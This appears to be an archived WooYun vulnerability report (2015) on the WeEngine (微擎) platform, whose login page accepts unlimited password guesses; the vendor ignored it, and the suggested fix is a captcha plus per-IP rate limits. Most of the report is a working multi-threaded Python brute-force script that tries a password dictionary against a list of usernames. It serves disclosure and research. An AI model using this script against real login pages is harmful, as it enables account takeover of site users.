{"id": 24685, "wybug_id": "wooyun-2015-0138492", "wybug_title": "微擎某功能存在逻辑错误可撞库", "wybug_corp": "we7.cc", "wybug_author": "timor", "wybug_date": "2015-09-02 09:30", "wybug_open_date": "2015-09-07 09:32", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["暴力破解"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-07：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  微擎登陆页面可无限次暴力破解\n\n利用代码\n# -*- coding: latin-1 -*-import urllib2import urllibimport httplibimport cookielibimport threadingimport sysdef openfile(path):\tfp=open(path)\tfiles = []\tfor password in fp.readlines():\t\tfiles.append(password.replace('\\n',''))\tfp.close()\treturn filesdef sendinfo(username,password):\ttry:\t\tdata =  urllib.urlencode({\"username\":username,\"password\":password,\"submit\":\"%E7%99%BB%E5%BD%95\",\"token\":\"9139c24b\"})#token值抓包，估计会变\t\theaders = {\"Content-type\": \"application/x-www-form-urlencoded\"\t\t\t, \"Accept\": \"text/plain\"}\t\thttpClient = httplib.HTTPConnection(\"localhost\", 80, timeout=30)\t\thttpClient.request(\"POST\", \"/weixin/web/index.php?c=user&a=login&\", data, headers)\t\tresponse = httpClient.getresponse()\t\tif len(response.read()) > 3700:\t\t\tprint \"<mi> \"+username+\":\"+password+\"<ma>\"\texcept Exception,e:\t\tprint e\tfinally:\t\tif httpClient:\t\t\thttpClient.close()def check(username,passwords):\tfor password in passwords:\t\tsys.stdout.write(\"Username: %s   PassWord: %s \\r\" % (username,password))\t\tsys.stdout.flush()\t\tsendinfo(username,password)if __name__ == '__main__':\tpasswords=openfile(\"pass.dic\")#字典\tusername = openfile(\"username.txt\")#学生用户名\tthreads = []\tfor user in username:\t\tthreads.append(threading.Thread(target=check,args=(user,passwords)))\tfor t in threads:\t\tt.start()\tt.join()\tprint \"all is over\"\n   漏洞证明：  \n\n   修复方案：  加验证码和IP访问的次数   版权声明：转载请注明来源 timor@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-09-07 09:32 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}